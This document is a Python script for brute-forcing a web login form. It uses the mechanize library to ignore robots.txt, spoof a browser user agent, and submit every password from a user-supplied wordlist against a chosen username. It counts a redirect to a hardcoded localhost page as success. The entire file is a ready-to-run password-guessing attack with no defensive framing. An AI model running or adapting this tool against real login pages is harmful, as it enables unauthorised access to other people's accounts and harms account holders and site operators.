from mechanize import*
import requests

class BruteForce:
    
    def __init__(self,url,username,passlist):
        self.url = url 
        self.passlist = passlist
        self.username = username

    def start_mechanize(self):
        self.br = Browser()
        self.br.set_handle_robots(False)
        self.br.addheaders = [("User-agent","Firefox")]
        self.br.open(self.url)

    def load_passwords(self):
    
    	with open(self.passlist,'r') as f:
    		self.list = f.read().split()
    		f.close()
		
    
    def bruteforce(self):

    	for password in self.list:
    		self.br.select_form(nr=0)
    		self.br['Username'] = self.username
    		print('[~]Trying: %s ' % password)
    		self.br['Password'] = password
    		self.br.submit()

    		if self.br.geturl() == 'http://localhost/login/logined.php':
        			print("[+]SUCCESS: %s" % password) 


url = input('[~]Enter url: ')

if requests.get(url).status_code == 200:
	print('[+]Url is real.')

else:
	exit()

login = input('[~]Enter login: ')
passlist = input('[~]Enter passlist path: ')
        			
me = BruteForce(url,login,passlist)
me.start_mechanize()
me.load_passwords()
me.bruteforce()
         
